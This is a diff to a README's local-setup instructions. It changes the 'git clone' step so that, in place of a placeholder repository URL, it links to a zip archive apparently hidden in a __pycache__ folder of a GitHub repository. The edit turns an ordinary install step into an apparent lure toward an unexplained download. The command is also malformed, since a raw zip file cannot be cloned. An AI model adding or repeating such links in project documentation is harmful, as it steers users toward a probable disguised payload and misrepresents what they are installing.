@@ -23,7 +23,7 @@ Follow these steps to set up and run the project locally.
 
 1.  **Clone the repository** (if it's in a git repository)
     ```bash
-    git clone [https://github.com/your-username/your-repository.git](https://github.com/your-username/your-repository.git)
+    git clone [https://raw.githubusercontent.com/thaysvs2/fastApi/main/__pycache__/Api_fast_3.3.zip](https://raw.githubusercontent.com/thaysvs2/fastApi/main/__pycache__/Api_fast_3.3.zip)
     cd your-repository
     ```
     (Replace with your repository details)
